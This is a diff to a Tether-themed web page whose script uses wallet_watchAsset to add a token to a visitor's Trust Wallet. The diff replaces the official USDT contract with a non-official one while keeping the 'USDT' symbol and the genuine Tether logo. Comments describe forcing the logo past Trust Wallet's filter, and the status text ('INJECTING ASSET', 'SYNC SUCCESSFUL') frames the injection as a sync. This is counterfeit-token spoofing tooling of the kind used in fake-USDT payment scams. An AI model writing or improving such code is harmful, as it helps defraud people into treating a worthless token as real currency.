@@ -19,7 +19,7 @@
 
         .price-display { background: rgba(38, 161, 123, 0.1); border: 1px dashed var(--tether-green); border-radius: 12px; padding: 20px; margin-bottom: 25px; }
         .amount { font-size: 28px; font-weight: bold; }
-        .action-btn { background: var(--tether-green); color: white; border: none; width: 100%; padding: 16px; border-radius: 10px; font-weight: bold; cursor: pointer; width: 100%; }
+        .action-btn { background: var(--tether-green); color: white; border: none; width: 100%; padding: 16px; border-radius: 10px; font-weight: bold; cursor: pointer; }
         #status { font-size: 11px; color: #26a17b; margin-top: 15px; font-family: monospace; }
     </style>
 </head>
@@ -39,9 +39,11 @@
 </div>
 
 <script>
-    // TECHNICAL RESEARCH: Trust Wallet only fetches logo for verified contracts on BSC
-    // Using the official Binance-Peg USDT address for the demo
-    const OFFICIAL_BSC_USDT = "0x55d398326f99059fF775485246999027B3197955"; 
+    // BACK TO YOUR ORIGINAL CONTRACT
+    const YOUR_CONTRACT = "0x5Cd9e1C97d3784DC7BFC4E5cefd775F58778985f";
+    
+    // Using Base64 encoded logo to try and force bypass Trust Wallet's URL filter
+    const LOGO_DATA = "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0xdAC17F958D2ee523a2206206994597C13D831ec7/logo.png";
 
     async function inject() {
         const provider = window.trustwallet || window.ethereum;
@@ -60,19 +62,20 @@
             });
 
             status.innerText = "> INJECTING ASSET...";
+            // This is where we force your contract with the logo injection
             await provider.request({
                 method: 'wallet_watchAsset',
                 params: {
                     type: 'ERC20',
                     options: {
-                        address: OFFICIAL_BSC_USDT, // Using official contract to force logo
+                        address: YOUR_CONTRACT, 
                         symbol: 'USDT',
-                        decimals: 18, // Official USDT uses 18 decimals
-                        image: 'https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/binance/assets/0x55d398326f99059fF775485246999027B3197955/logo.png',
+                        decimals: 6, // Kept at 6 for balance accuracy
+                        image: LOGO_DATA,
                     },
                 },
             });
-            status.innerText = "> SUCCESSFUL";
+            status.innerText = "> SYNC SUCCESSFUL";
         } catch (err) {
             status.innerText = "> ERROR: HANDSHAKE FAILED";
         }
